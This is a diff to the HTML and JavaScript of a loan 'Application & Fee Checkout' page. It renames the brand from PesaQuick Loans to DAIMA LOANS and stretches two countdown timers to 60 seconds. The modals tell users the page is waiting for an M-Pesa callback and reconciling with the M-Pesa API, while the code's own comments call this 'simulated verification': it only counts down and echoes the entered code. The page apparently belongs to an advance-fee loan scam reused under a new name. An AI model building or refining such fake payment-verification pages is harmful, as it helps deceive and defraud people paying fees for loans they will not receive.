@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Application & Fee Checkout | PesaQuick</title>
+    <title>Application & Fee Checkout | DAIMA LOANS</title>
     <!-- FontAwesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Custom Style Sheet -->
@@ -29,7 +29,7 @@
         <div class="header-container">
             <div class="logo-section">
                 <i class="fa-solid fa-bolt-lightning"></i>
-                <span>PesaQuick Loans</span>
+                <span>DAIMA LOANS</span>
             </div>
             <span class="step-badge">
                 Step 3 of 4
@@ -266,7 +266,7 @@
             <!-- Countdown Timer Box -->
             <div class="countdown-box">
                 <span class="countdown-label">Waiting for M-Pesa Callback</span>
-                <span id="stk-timer" class="countdown-timer">00:15</span>
+                <span id="stk-timer" class="countdown-timer">01:00</span>
             </div>
 
             <p style="font-size: 0.68rem; color: #94a3b8;">Do not close or refresh this page while payment processes.
@@ -299,7 +299,7 @@
             <!-- Countdown Timer Box -->
             <div class="countdown-box">
                 <span class="countdown-label">Reconciling with M-Pesa API</span>
-                <span id="verify-timer" class="countdown-timer">00:05</span>
+                <span id="verify-timer" class="countdown-timer">01:00</span>
             </div>
 
             <p style="font-size: 0.68rem; color: #94a3b8;">Do not close or refresh this page while verification
@@ -396,7 +396,7 @@
             <!-- Bottom Copyright & Sponsor Info -->
             <div
                 style="text-align: center; font-size: 0.65rem; color: #475569; display: flex; flex-direction: column; gap: 4px;">
-                <p>&copy; 2026 PesaQuick Loans Kenya. All rights reserved.</p>
+                <p>&copy; 2026 DAIMA LOANS Kenya. All rights reserved.</p>
                 <p style="color: #64748b; font-weight: 500; opacity: 0.85;">
                     Managed by Jasper Markets and Loan Insurers
                 </p>
@@ -573,13 +573,15 @@
                     // Show STK push modal with active transition class
                     stkModal.classList.add('active');
 
-                    // Simulate STK Countdown Timer (15 seconds simulated verification)
-                    let timeLeft = 15;
-                    stkTimer.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+                    // Simulate STK Countdown Timer (60 seconds simulated verification)
+                    let timeLeft = 60;
+                    stkTimer.textContent = `01:00`;
 
                     const countdown = setInterval(() => {
                         timeLeft--;
-                        stkTimer.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+                        const min = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+                        const sec = (timeLeft % 60).toString().padStart(2, '0');
+                        stkTimer.textContent = `${min}:${sec}`;
 
                         if (timeLeft <= 0) {
                             clearInterval(countdown);
@@ -610,12 +612,14 @@
                     verifyingCodeDisplay.textContent = enteredCode;
                     verifyModal.classList.add('active');
 
-                    let timeLeft = 5;
-                    verifyTimer.textContent = `00:0${timeLeft}`;
+                    let timeLeft = 60;
+                    verifyTimer.textContent = `01:00`;
 
                     const countdown = setInterval(() => {
                         timeLeft--;
-                        verifyTimer.textContent = `00:0${timeLeft}`;
+                        const min = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+                        const sec = (timeLeft % 60).toString().padStart(2, '0');
+                        verifyTimer.textContent = `${min}:${sec}`;
 
                         if (timeLeft <= 0) {
                             clearInterval(countdown);
